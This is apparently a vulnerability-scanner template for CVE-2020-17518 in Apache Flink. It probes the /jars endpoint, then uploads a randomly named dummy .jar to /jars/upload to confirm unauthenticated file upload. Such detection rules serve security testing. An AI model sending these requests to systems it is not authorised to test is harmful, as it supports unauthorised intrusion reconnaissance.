name: poc-yaml-apache-flink-upload-cve-2020-17518
set:
    r1a: randomLowercase(8)
    r2a: randomLowercase(4)
rules:
  r0:
    request:
      method: GET
      path: /jars
      follow_redirects: true
    expression: |
        response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b"address") && response.body.bcontains(b"files")
  r1:
    request:
      method: POST
      path: /jars/upload
      headers:
          Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
      body: |-
        --8ce4b16b22b58894aa86c421e8759df3
        Content-Disposition: form-data; name="jarfile";filename="{{r2a}}.jar"
        Content-Type:application/octet-stream

        {{r1a}}
        --8ce4b16b22b58894aa86c421e8759df3--

      follow_redirects: true
    expression: |
        response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b"success") && response.body.bcontains(bytes(r2a))
expression: r0() && r1()
detail:
    links:
        - https://vulhub.org/#/environments/flink/CVE-2020-17518/
